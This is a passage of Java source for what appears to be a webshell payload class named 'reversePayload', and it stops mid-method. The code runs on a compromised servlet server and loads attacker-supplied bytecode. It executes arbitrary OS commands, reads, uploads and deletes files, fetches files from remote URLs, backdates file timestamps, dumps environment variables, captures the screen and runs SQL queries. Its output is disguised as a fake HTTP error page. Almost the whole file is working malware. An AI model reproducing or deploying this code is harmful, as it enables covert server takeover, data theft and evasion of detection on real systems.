package shells.payloads.java.assets;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.FileTime;
import java.sql.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.Date;
import java.util.List;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class reversePayload extends ClassLoader {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    HashMap parameterMap = new HashMap();
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;
    Class c0 = null;
    Class c1 = null;
    Class c2 = null;
    Class c3 = null;
    Class c4 = null;
    Class c5 = null;
    Class c6 = null;
    Class c7 = null;
    static Class c8 = null;
    static Class c9 = null;
    static Class c10 = null;

    static Map<String, String> funcMap = new HashMap<>();

    static {
       funcMap.put("getFile","1");
        funcMap.put("readFile","2");
        funcMap.put("getBasicsInfo","3");
        funcMap.put("include","4");
        funcMap.put("uploadFile","5");
        funcMap.put("copyFile","6");
        funcMap.put("deleteFile","7");
        funcMap.put("newFile","8");
        funcMap.put("newDir","9");
        funcMap.put("execSql","10");
        funcMap.put("test","11");
        funcMap.put("bigFileUpload","12");
        funcMap.put("bigFileDownload","13");
        funcMap.put("execCommand","14");
        funcMap.put("moveFile","16");
        funcMap.put("fileRemoteDown","16");
        funcMap.put("setFileAttr","17");
        funcMap.put("close","18");
}
    static Map<String, String> parmaMap = new HashMap<>();
    static {
        parmaMap.put("dirName", "19");
        parmaMap.put("fileName", "20");
        parmaMap.put("codeName", "21");
        parmaMap.put("binCode", "22");
        parmaMap.put("evalClassName", "23");
        parmaMap.put("methodName", "24");
        parmaMap.put("dbType", "25");
        parmaMap.put("fileValue", "26");
        parmaMap.put("srcFileName", "27");
        parmaMap.put("destFileName", "28");
        parmaMap.put("dbHost", "29");
        parmaMap.put("dbPort", "30");
        parmaMap.put("dbUsername", "31");
        parmaMap.put("dbPassword", "32");
        parmaMap.put("execType", "33");
        parmaMap.put("execSql", "34");
        parmaMap.put("dbCharset", "35");
        parmaMap.put("currentDb", "36");
        parmaMap.put("fileContents", "37");
        parmaMap.put("position", "38");
        parmaMap.put("readByteNum", "39");
        parmaMap.put("mode", "40");
        parmaMap.put("cmdLine", "41");
        parmaMap.put("argsCount", "42");
        parmaMap.put("executableFile", "43");
        parmaMap.put("executableArgs", "44");
        parmaMap.put("url", "45");
        parmaMap.put("saveFile", "46");
        parmaMap.put("type", "47");
        parmaMap.put("attr", "46");
        parmaMap.put("arg-0", "48");
        parmaMap.put("arg-1", "49");
        parmaMap.put("arg-2", "50");
        parmaMap.put("arg-3", "51");
        parmaMap.put("arg-4", "52");
        parmaMap.put("arg-5", "53");
        parmaMap.put("arg-6", "54");
        parmaMap.put("arg-7", "55");
        parmaMap.put("arg-8", "56");
        parmaMap.put("arg-9", "57");
    }
    public reversePayload() {
    }

    public reversePayload(ClassLoader loader) {
        super(loader);
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public byte[] run() {
        try {
            String className = this.get("evalClassName");
            String methodName1 = this.get("methodName");
            String methodName = (String) getKey(funcMap, methodName1);
            if (methodName == null || methodName.equals("")){
                methodName = methodName1;
            }
            if (methodName != null) {
                Class var10000;
                if (className == null) {
                    Method method = this.getClass().getMethod(methodName, (Class[])null);
                    var10000 = method.getReturnType();
                    Class var10001 = this.c0;
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("[B");
                        } catch (ClassNotFoundException var8) {
                            throw new NoClassDefFoundError(var8.getMessage());
                        }

                        this.c0 = var10001;
                    }

                    return var10000.isAssignableFrom(var10001) ? (byte[])((byte[])method.invoke(this, (Object[])null)) : "this method returnType not is byte[]".getBytes();
                } else {
                    Class evalClass = (Class)this.sessionMap.get(className);
                    if (evalClass != null) {
                        Object object = evalClass.newInstance();
                        object.equals(this.parameterMap);
                        object.toString();
                        Object resultObject = this.parameterMap.get("result");
                        if (resultObject != null) {
                            var10000 = this.c0;
                            if (var10000 == null) {
                                try {
                                    var10000 = Class.forName("[B");
                                } catch (ClassNotFoundException var9) {
                                    throw new NoClassDefFoundError(var9.getMessage());
                                }

                                this.c0 = var10000;
                            }

                            return var10000.isAssignableFrom(resultObject.getClass()) ? (byte[])((byte[])resultObject) : "return typeErr".getBytes();
                        } else {
                            return new byte[0];
                        }
                    } else {
                        return "evalClass is null".getBytes();
                    }
                }
            } else {
                return "method is null".getBytes();
            }
        } catch (Throwable var10) {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            PrintStream printStream = new PrintStream(stream);
            var10.printStackTrace(printStream);
            printStream.flush();
            printStream.close();
            return stream.toByteArray();
        }
    }

    private static Object getKey(Map map, Object value){
        String keyStr = "";
        for(Object key: map.keySet()){
            if(map.get(key).equals(value)){
                keyStr = (String) key;
            }
        }
        return keyStr;
    }

    public void formatParameter() {
        this.parameterMap.clear();
        this.parameterMap.put("sessionMap", this.sessionMap);
        this.parameterMap.put("servletRequest", this.servletRequest);
        this.parameterMap.put("servletContext", this.servletContext);
        this.parameterMap.put("httpSession", this.httpSession);
        byte[] parameterByte = this.requestData;
        ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        String key = null;
        byte[] lenB = new byte[4];
        Object var6 = null;

        try {
            GZIPInputStream inputStream = new GZIPInputStream(tStream);

            while(true) {
                while(true) {
                    byte t = (byte)inputStream.read();
                    if (t == -1) {
                        tp.close();
                        tStream.close();
                        inputStream.close();
                        return;
                    }

                    if (t == 2) {
                        key = new String(tp.toByteArray());
                        inputStream.read(lenB);
                        int len = bytesToInt(lenB);
                        byte[] data = new byte[len];
                        int readOneLen = 0;

                        while((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                        }
                        // 映射解析
                        String key1 = (String)getKey(funcMap, key);
                        if(key1 == null || key1.equals("")){
                            key1 = (String)getKey(parmaMap, key);
                        }
                        if(key1 == null || key1.equals("")){
                            key1 = key;
                        }
                        this.parameterMap.put(key1, data);
                        tp.reset();
                    } else {
                        tp.write(t);
                    }
                }
            }
        } catch (Exception var12) {
        }
    }

    public boolean equals(Object obj) {
        if (obj != null && this.handle(obj)) {
            this.noLog(this.servletContext);
            return true;
        } else {
            return false;
        }
    }

    public boolean handle(Object obj) {
        if (obj == null) {
            return false;
        } else {
            Class var10000 = this.c1;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.io.ByteArrayOutputStream");
                } catch (ClassNotFoundException var11) {
                    throw new NoClassDefFoundError(var11.getMessage());
                }

                this.c1 = var10000;
            }

            if (var10000.isAssignableFrom(obj.getClass())) {
                this.outputStream = (ByteArrayOutputStream)obj;
                return false;
            } else {
                if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
                    this.servletRequest = obj;
                } else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {
                    this.servletRequest = obj;
                } else {
                    var10000 = this.c0;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("[B");
                        } catch (ClassNotFoundException var10) {
                            throw new NoClassDefFoundError(var10.getMessage());
                        }

                        this.c0 = var10000;
                    }

                    if (var10000.isAssignableFrom(obj.getClass())) {
                        this.requestData = (byte[])((byte[])obj);
                    } else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {
                        this.httpSession = obj;
                    }
                }

                this.handlePayloadContext(obj);
                if (this.servletRequest != null && this.requestData == null) {
                    Object var10001 = this.servletRequest;
                    Class[] var10003 = new Class[1];
                    Class var10006 = this.c2;
                    if (var10006 == null) {
                        try {
                            var10006 = Class.forName("java.lang.String");
                        } catch (ClassNotFoundException var9) {
                            throw new NoClassDefFoundError(var9.getMessage());
                        }

                        this.c2 = var10006;
                    }

                    var10003[0] = var10006;
                    Object retVObject = this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{"parameters"});
                    if (retVObject != null) {
                        var10000 = this.c0;
                        if (var10000 == null) {
                            try {
                                var10000 = Class.forName("[B");
                            } catch (ClassNotFoundException var8) {
                                throw new NoClassDefFoundError(var8.getMessage());
                            }

                            this.c0 = var10000;
                        }

                        if (var10000.isAssignableFrom(retVObject.getClass())) {
                            this.requestData = (byte[])((byte[])retVObject);
                        }
                    }
                }

                return true;
            }
        }
    }

    private void handlePayloadContext(Object obj) {
        try {
            Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", (Class[])null);
            Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", (Class[])null);
            Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", (Class[])null);
            if (getRequestMethod != null && this.servletRequest == null) {
                this.servletRequest = getRequestMethod.invoke(obj, (Object[])null);
            }

            if (getServletContextMethod != null && this.servletContext == null) {
                this.servletContext = getServletContextMethod.invoke(obj, (Object[])null);
            }

            if (getSessionMethod != null && this.httpSession == null) {
                this.httpSession = getSessionMethod.invoke(obj, (Object[])null);
            }
        } catch (Exception var5) {
        }

    }

    private boolean supportClass(Object obj, String classNameString) {
        if (obj == null) {
            return false;
        } else {
            boolean ret = false;
            Class c = null;

            try {
                if ((c = getClass(String.format(classNameString, "javax"))) != null) {
                    ret = c.isAssignableFrom(obj.getClass());
                }

                if (!ret && (c = getClass(String.format(classNameString, "jakarta"))) != null) {
                    ret = c.isAssignableFrom(obj.getClass());
                }
            } catch (Exception var6) {
            }

            return ret;
        }
    }

    public String generateHtml(byte[] data){
        String base64 = base64Encode(data);
        String htmlTemplate = "<!doctype html><html lang=\"zh\"><head><title>HTTP状态</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif; no-repeat center;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status</h1><hr class=\"line\" /><p><img src='data:image/png;base64,{data}'><b>类型</b> 状态报告</p><p><b>描述</b> 源服务器未能找到目标资源的表示或者是不愿公开一个已经存在的资源表示。</p><hr class=\"line\" /></body></html>";
        htmlTemplate = htmlTemplate.replace("{data}", base64);
        return htmlTemplate;
    }


    public String toString() {
        String returnString = null;
        if (this.outputStream != null) {
            try {
                GZIPOutputStream gzipOutputStream = new GZIPOutputStream(this.outputStream);
                this.initSessionMap();
                this.formatParameter();
                if (this.parameterMap.get("evalNextData") != null) {
                    this.run();
                    this.requestData = (byte[])((byte[])this.parameterMap.get("evalNextData"));
                    this.formatParameter();
                }
                gzipOutputStream.write(this.run());
                gzipOutputStream.close();
                this.outputStream.close();
                return generateHtml(this.outputStream.toByteArray());
            } catch (Throwable var3) {
                returnString = var3.getMessage();
            }
        } else {
            returnString = "outputStream is null";
        }

        this.httpSession = null;
        this.outputStream = null;
        this.parameterMap = null;
        this.requestData = null;
        this.servletContext = null;
        this.servletRequest = null;
        this.sessionMap = null;
        return "";
    }




    private void initSessionMap() {
        if (this.sessionMap == null) {
            if (this.getSessionAttribute("sessionMap") != null) {
                try {
                    this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
                } catch (Exception var3) {
                }
            } else {
                this.sessionMap = new HashMap();

                try {
                    this.setSessionAttribute("sessionMap", this.sessionMap);
                } catch (Exception var2) {
                }
            }

            if (this.sessionMap == null) {
                this.sessionMap = new HashMap();
            }
        }

    }

    public String get(String key) {
        try {
            return new String((byte[])((byte[])this.parameterMap.get(key)));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] getByteArray(String key) {
        try {
            return (byte[])((byte[])this.parameterMap.get(key));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] test() {
        return "ok".getBytes();
    }

    public byte[] getFile() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            dirName = dirName.trim();
            String buffer = new String();

            try {
                String currentDir = (new File(dirName)).getAbsoluteFile() + "/";
                File currentDirFile = new File(currentDir);
                if (!currentDirFile.exists()) {
                    return "dir does not exist".getBytes();
                }

                File[] files = currentDirFile.listFiles();
                buffer = buffer + "ok";
                buffer = buffer + "\n";
                buffer = buffer + currentDir;
                buffer = buffer + "\n";
                if (files != null) {
                    for(int i = 0; i < files.length; ++i) {
                        File file = files[i];

                        try {
                            buffer = buffer + file.getName();
                            buffer = buffer + "\t";
                            buffer = buffer + (file.isDirectory() ? "0" : "1");
                            buffer = buffer + "\t";
                            buffer = buffer + (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(file.lastModified()));
                            buffer = buffer + "\t";
                            buffer = buffer + Integer.toString((int)file.length());
                            buffer = buffer + "\t";
                            StringBuffer var10000 = (new StringBuffer(String.valueOf(file.canRead() ? "R" : ""))).append(file.canWrite() ? "W" : "");
                            Class var10002 = this.c3;
                            if (var10002 == null) {
                                try {
                                    var10002 = Class.forName("java.io.File");
                                } catch (ClassNotFoundException var11) {
                                    throw new NoClassDefFoundError(var11.getMessage());
                                }

                                this.c3 = var10002;
                            }

                            String fileState = var10000.append(this.getMethodByClass(var10002, "canExecute", (Class[])null) != null ? (file.canExecute() ? "X" : "") : "").toString();
                            buffer = buffer + (fileState != null && fileState.trim().length() != 0 ? fileState : "F");
                            buffer = buffer + "\n";
                        } catch (Exception var12) {
                            buffer = buffer + var12.getMessage();
                            buffer = buffer + "\n";
                        }
                    }
                }
            } catch (Exception var13) {
                return String.format("dir does not exist errMsg:%s", var13.getMessage()).getBytes();
            }

            return buffer.getBytes();
        } else {
            return "No parameter dirName".getBytes();
        }
    }

    public String listFileRoot() {
        File[] files = File.listRoots();
        String buffer = new String();

        for(int i = 0; i < files.length; ++i) {
            buffer = buffer + files[i].getPath();
            buffer = buffer + ";";
        }

        return buffer;
    }

    public byte[] fileRemoteDown() {
        String url = this.get("url");
        String saveFile = this.get("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream outputStream = null;

            try {
                InputStream inputStream = (new URL(url)).openStream();
                outputStream = new FileOutputStream(saveFile);
                byte[] data = new byte[5120];
                boolean var6 = true;

                int readNum;
                while((readNum = inputStream.read(data)) != -1) {
                    outputStream.write(data, 0, readNum);
                }

                outputStream.flush();
                outputStream.close();
                inputStream.close();
                return "ok".getBytes();
            } catch (Exception var9) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException var8) {
                        return var8.getMessage().getBytes();
                    }
                }

                return String.format("%s : %s", var9.getClass().getName(), var9.getMessage()).getBytes();
            }
        } else {
            return "url or saveFile is null".getBytes();
        }
    }

    public byte[] setFileAttr() {
        String type = this.get("type");
        String attr = this.get("attr");
        String fileName = this.get("fileName");
        String ret = "Null";
        if (type != null && attr != null && fileName != null) {
            try {
                File file = new File(fileName);
                Class var10001;
                if ("fileBasicAttr".equals(type)) {
                    var10001 = this.c3;
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("java.io.File");
                        } catch (ClassNotFoundException var18) {
                            throw new NoClassDefFoundError(var18.getMessage());
                        }

                        this.c3 = var10001;
                    }

                    if (this.getMethodByClass(var10001, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                        if (attr.indexOf("R") != -1) {
                            file.setReadable(true);
                        }

                        if (attr.indexOf("W") != -1) {
                            file.setWritable(true);
                        }

                        if (attr.indexOf("X") != -1) {
                            file.setExecutable(true);
                        }

                        ret = "ok";
                    } else {
                        ret = "Java version is less than 1.6";
                    }
                } else if ("fileTimeAttr".equals(type)) {
                    var10001 = this.c3;
                    if (var10001 == null) {
                        try {
                            var10001 = Class.forName("java.io.File");
                        } catch (ClassNotFoundException var17) {
                            throw new NoClassDefFoundError(var17.getMessage());
                        }

                        this.c3 = var10001;
                    }

                    if (this.getMethodByClass(var10001, "setLastModified", new Class[]{Long.TYPE}) != null) {
                        Date date = new Date(0L);
                        StringBuilder builder = new StringBuilder();
                        builder.append(attr);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        date = new Date(date.getTime() + Long.parseLong(builder.toString()));
                        file.setLastModified(date.getTime());
                        ret = "ok";

                        try {
                            Class nioFile = Class.forName("java.nio.file.Paths");
                            Class basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                            Class filesClass = Class.forName("java.nio.file.Files");
                            if (nioFile != null && basicFileAttributeViewClass != null && filesClass != null) {
                                Path var10000 = Paths.get(fileName);
                                var10001 = this.c4;
                                if (var10001 == null) {
                                    try {
                                        var10001 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                                    } catch (ClassNotFoundException var15) {
                                        throw new NoClassDefFoundError(var15.getMessage());
                                    }

                                    this.c4 = var10001;
                                }

                                BasicFileAttributeView attributeView = (BasicFileAttributeView)Files.getFileAttributeView(var10000, var10001);
                                attributeView.setTimes(FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()), FileTime.fromMillis(date.getTime()));
                            }
                        } catch (Exception var16) {
                        }
                    } else {
                        ret = "Java version is less than 1.2";
                    }
                } else {
                    ret = "no ExcuteType";
                }
            } catch (Exception var19) {
                return String.format("Exception errMsg:%s", var19.getMessage()).getBytes();
            }
        } else {
            ret = "type or attr or fileName is null";
        }

        return ret.getBytes();
    }

    public byte[] readFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);

            try {
                if (file.exists() && file.isFile()) {
                    byte[] data = new byte[(int)file.length()];
                    FileInputStream fileInputStream;
                    if (data.length > 0) {
                        int readOneLen = 0;
                        fileInputStream = new FileInputStream(file);

                        while(true) {
                            if ((readOneLen += fileInputStream.read(data, readOneLen, data.length - readOneLen)) >= data.length) {
                                fileInputStream.close();
                                break;
                            }
                        }
                    } else {
                        byte[] temData = new byte[3145728];
                        fileInputStream = new FileInputStream(file);
                        int readLen = fileInputStream.read(temData);
                        if (readLen > 0) {
                            data = new byte[readLen];
                            System.arraycopy(temData, 0, data, 0, data.length);
                        }

                        fileInputStream.close();
                        Object var7 = null;
                    }

                    return data;
                } else {
                    return "file does not exist".getBytes();
                }
            } catch (Exception var8) {
                return var8.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] uploadFile() {
        String fileName = this.get("fileName");
        byte[] fileValue = this.getByteArray("fileValue");
        if (fileName != null && fileValue != null) {
            try {
                File file = new File(fileName);
                file.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileValue);
                fileOutputStream.close();
                return "ok".getBytes();
            } catch (Exception var5) {
                return var5.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName and fileValue".getBytes();
        }
    }

    public byte[] newFile() {
        String fileName = this.get("fileName");
        if (fileName != null) {
            File file = new File(fileName);

            try {
                return file.createNewFile() ? "ok".getBytes() : "fail".getBytes();
            } catch (Exception var4) {
                return var4.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] newDir() {
        String dirName = this.get("dirName");
        if (dirName != null) {
            File file = new File(dirName);

            try {
                return file.mkdirs() ? "ok".getBytes() : "fail".getBytes();
            } catch (Exception var4) {
                return var4.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] deleteFile() {
        String dirName = this.get("fileName");
        if (dirName != null) {
            try {
                File file = new File(dirName);
                this.deleteFiles(file);
                return "ok".getBytes();
            } catch (Exception var3) {
                return var3.getMessage().getBytes();
            }
        } else {
            return "No parameter fileName".getBytes();
        }
    }

    public byte[] moveFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File file = new File(srcFileName);

            try {
                if (file.exists()) {
                    return file.renameTo(new File(destFileName)) ? "ok".getBytes() : "fail".getBytes();
                } else {
                    return "The target does not exist".getBytes();
                }
            } catch (Exception var5) {
                return var5.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] copyFile() {
        String srcFileName = this.get("srcFileName");
        String destFileName = this.get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File srcFile = new File(srcFileName);
            File destFile = new File(destFileName);

            try {
                if (srcFile.exists() && srcFile.isFile()) {
                    FileInputStream fileInputStream = new FileInputStream(srcFile);
                    FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                    byte[] data = new byte[5120];
                    boolean var8 = false;

                    int readNum;
                    while((readNum = fileInputStream.read(data)) > -1) {
                        fileOutputStream.write(data, 0, readNum);
                    }

                    fileInputStream.close();
                    fileOutputStream.close();
                    return "ok".getBytes();
                } else {
                    return "The target does not exist or is not a file".getBytes();
                }
            } catch (Exception var10) {
                return var10.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] include() {
        byte[] binCode = this.getByteArray("binCode");
        String className = this.get("codeName");
        if (binCode != null && className != null) {
            try {
                reversePayload payload = new reversePayload(this.getClass().getClassLoader());
                Class module = payload.g(binCode);
                this.sessionMap.put(className, module);
                return "ok".getBytes();
            } catch (Exception var5) {
                return this.sessionMap.get(className) != null ? "ok".getBytes() : var5.getMessage().getBytes();
            }
        } else {
            return "No parameter binCode,codeName".getBytes();
        }
    }

    public Object getSessionAttribute(String keyString) {
        if (this.httpSession != null) {
            Object var10001 = this.httpSession;
            Class[] var10003 = new Class[1];
            Class var10006 = this.c2;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.String");
                } catch (ClassNotFoundException var6) {
                    throw new NoClassDefFoundError(var6.getMessage());
                }

                this.c2 = var10006;
            }

            var10003[0] = var10006;
            return this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{keyString});
        } else {
            return null;
        }
    }

    public void setSessionAttribute(String keyString, Object value) {
        if (this.httpSession != null) {
            Object var10001 = this.httpSession;
            Class[] var10003 = new Class[2];
            Class var10006 = this.c2;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.String");
                } catch (ClassNotFoundException var8) {
                    throw new NoClassDefFoundError(var8.getMessage());
                }

                this.c2 = var10006;
            }

            var10003[0] = var10006;
            var10006 = this.c5;
            if (var10006 == null) {
                try {
                    var10006 = Class.forName("java.lang.Object");
                } catch (ClassNotFoundException var7) {
                    throw new NoClassDefFoundError(var7.getMessage());
                }

                this.c5 = var10006;
            }

            var10003[1] = var10006;
            this.getMethodAndInvoke(var10001, "setAttribute", var10003, new Object[]{keyString, value});
        }

    }

    public byte[] execCommand() {
        String argsCountStr = this.get("argsCount");
        if (argsCountStr != null && argsCountStr.length() > 0) {
            try {
                Process process = null;
                ArrayList argsList = new ArrayList();
                int argsCount = Integer.parseInt(argsCountStr);
                if (argsCount <= 0) {
                    return "argsCount <=0".getBytes();
                } else {
                    for(int i = 0; i < argsCount; ++i) {
                        String val = this.get(String.format("arg-%d", new Integer(i)));
                        if (val != null) {
                            argsList.add(val);
                        }
                    }

                    String[] cmdarray = new String[argsList.size()];

                    for(int i = 0; i < argsList.size(); ++i) {
                        cmdarray[i] = (String)argsList.get(i);
                    }

                    process = Runtime.getRuntime().exec((String[])((String[])argsList.toArray(new String[0])));
                    if (process == null) {
                        return "Unable to start process".getBytes();
                    } else {
                        InputStream inputStream = process.getInputStream();
                        InputStream errorInputStream = process.getErrorStream();
                        ByteArrayOutputStream memStream = new ByteArrayOutputStream(1024);
                        byte[] buff = new byte[521];
                        int readNum;
                        if (inputStream != null) {
                            while((readNum = inputStream.read(buff)) > 0) {
                                memStream.write(buff, 0, readNum);
                            }
                        }

                        if (errorInputStream != null) {
                            while((readNum = errorInputStream.read(buff)) > 0) {
                                memStream.write(buff, 0, readNum);
                            }
                        }

                        return memStream.toByteArray();
                    }
                }
            } catch (Exception var11) {
                return var11.getMessage().getBytes();
            }
        } else {
            return "No parameter argsCountStr".getBytes();
        }
    }

    public byte[] getBasicsInfo() {
        try {
            Enumeration keys = System.getProperties().keys();
            String basicsInfo = new String();
            basicsInfo = basicsInfo + "FileRoot : " + this.listFileRoot() + "\n";
            basicsInfo = basicsInfo + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/\n";
            basicsInfo = basicsInfo + "CurrentUser : " + System.getProperty("user.name") + "\n";
            basicsInfo = basicsInfo + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

            try {
                String tmpdir = System.getProperty("java.io.tmpdir");
                char lastChar = tmpdir.charAt(tmpdir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tmpdir = tmpdir + File.separator;
                }

                basicsInfo = basicsInfo + "TempDirectory : " + tmpdir + "\n";
            } catch (Exception var7) {
            }

            basicsInfo = basicsInfo + "DocBase : " + this.getDocBase() + "\n";
            basicsInfo = basicsInfo + "RealFile : " + this.getRealPath() + "\n";
            basicsInfo = basicsInfo + "servletRequest : " + (this.servletRequest == null ? "null" : this.servletRequest.hashCode() + "\n");
            basicsInfo = basicsInfo + "servletContext : " + (this.servletContext == null ? "null" : this.servletContext.hashCode() + "\n");
            basicsInfo = basicsInfo + "httpSession : " + (this.httpSession == null ? "null" : this.httpSession.hashCode() + "\n");

            try {
                basicsInfo = basicsInfo + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
            } catch (Exception var6) {
                basicsInfo = basicsInfo + "OsInfo : " + var6.getMessage() + "\n";
            }

            basicsInfo = basicsInfo + "IPList : " + getLocalIPList() + "\n";

            String key;
            while(keys.hasMoreElements()) {
                Object object = keys.nextElement();
                if (object instanceof String) {
                    key = (String)object;
                    basicsInfo = basicsInfo + key + " : " + System.getProperty(key) + "\n";
                }
            }

            Map envMap = this.getEnv();
            if (envMap != null) {
                for(Iterator iterator = envMap.keySet().iterator(); iterator.hasNext(); basicsInfo = basicsInfo + key + " : " + envMap.get(key) + "\n") {
                    key = (String)iterator.next();
                }
            }

            return basicsInfo.getBytes();
        } catch (Exception var8) {
            return var8.getMessage().getBytes();
        }
    }

    public byte[] screen() {
        try {
            Robot robot = new Robot();
            BufferedImage as = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            ByteArrayOutputStream bs = new ByteArrayOutputStream();
            ImageIO.write(as, "png", ImageIO.createImageOutputStream(bs));
            byte[] data = bs.toByteArray();
            bs.close();
            return data;
        } catch (Exception var5) {
            return var5.getMessage().getBytes();
        }
    }

    public byte[] execSql() throws Exception {
        String charset = this.get("dbCharset");
        String dbType = this.get("dbType");
        String dbHost = this.get("dbHost");
        String dbPort = this.get("dbPort");
        String dbUsername = this.get("dbUsername");
        String dbPassword = this.get("dbPassword");
        String execType = this.get("execType");
        String execSql = new String(this.getByteArray("execSql"), charset);
        if (dbType != null && dbHost != null && dbPort != null && dbUsername != null && dbPassword != null && execType != null && execSql != null) {
            try {
                try {
                    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                } catch (Exception var24) {
                }

                try {
                    Class.forName("oracle.jdbc.driver.OracleDriver");
                } catch (Exception var23) {
                    try {
                        Class.forName("oracle.jdbc.OracleDriver");
                    } catch (Exception var22) {
                    }
                }

                try {
                    Class.forName("com.mysql.cj.jdbc.Driver");
                } catch (Exception var21) {
                    try {
                        Class.forName("com.mysql.jdbc.Driver");
                    } catch (Exception var20) {
                    }
                }

                try {
                    Class.forName("org.postgresql.Driver");
                } catch (Exception var19) {
                }

                try {
                    Class.forName("org.sqlite.JDBC");
                } catch (Exception var18) {
                }

                String connectUrl = null;
                if ("mysql".equals(dbType)) {
                    connectUrl = "jdbc:mysql://" + dbHost + ":" + dbPort + "/?useSSL=false&serverTimezone=UTC&zeroDateTimeBehavior=convertToNull&noDatetimeStringSync=true&characterEncoding=utf-8";
                } else if ("oracle".equals(dbType)) {
                    connectUrl = "jdbc:oracle:thin:@" + dbHost + ":" + dbPort + ":orcl";
                } else if ("sqlserver".equals(dbType)) {
                    connectUrl = "jdbc:sqlserver://" + dbHost + ":" + dbPort + ";";
                } else if ("postgresql".equals(dbType)) {
                    connectUrl = "jdbc:postgresql://" + dbHost + ":" + dbPort + "/";
                } else if ("sqlite".equals(dbType)) {
                    connectUrl = "jdbc:sqlite:" + dbHost;
                }

                if (dbHost.indexOf("jdbc:") != -1) {
                    connectUrl = dbHost;
                }

                if (connectUrl != null) {
                    try {
                        Connection dbConn = null;

                        try {
                            dbConn = getConnection(connectUrl, dbUsername, dbPassword);
                        } catch (Exception var17) {
                        }

                        if (dbConn == null) {
                            dbConn = DriverManager.getConnection(connectUrl, dbUsername, dbPassword);
                        }

                        Statement statement = dbConn.createStatement();
                        if (!execType.equals("select")) {
                            int affectedNum = statement.executeUpdate(execSql);
                            statement.close();
                            dbConn.close();
                            return ("Query OK, " + affectedNum + " rows affected").getBytes();
                        } else {
                            String data = "ok\n";
                            ResultSet resultSet = statement.executeQuery(execSql);
                            ResultSetMetaData metaData = resultSet.getMetaData();
                            int columnNum = metaData.getColumnCount();

                            int i;
                            for(i = 0; i < columnNum; ++i) {
